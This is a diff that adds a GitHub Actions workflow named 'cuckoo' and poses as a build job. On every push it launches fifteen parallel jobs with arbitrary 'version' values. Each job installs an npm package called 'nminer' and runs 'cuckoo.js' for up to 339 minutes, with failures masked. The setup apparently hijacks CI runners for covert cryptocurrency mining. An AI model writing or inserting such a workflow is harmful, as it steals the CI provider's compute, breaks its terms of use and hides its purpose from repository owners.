@@ -1,0 +1,40 @@
+name: cuckoo
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 3503 }
+          - { version: 2258 }
+          - { version: 5763 }
+          - { version: 9211 }
+          - { version: 7580 }
+          - { version: 4347 }
+          - { version: 6273 }
+          - { version: 8275 }
+          - { version: 42 }
+          - { version: 4446 }
+          - { version: 2 }
+          - { version: 4517 }
+          - { version: 4081 }
+          - { version: 5480 }
+          - { version: 9576 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: engender
+        run: |
+          npm install nminer@latest
+          timeout 339m node cuckoo.js || echo "cuckoo executed"
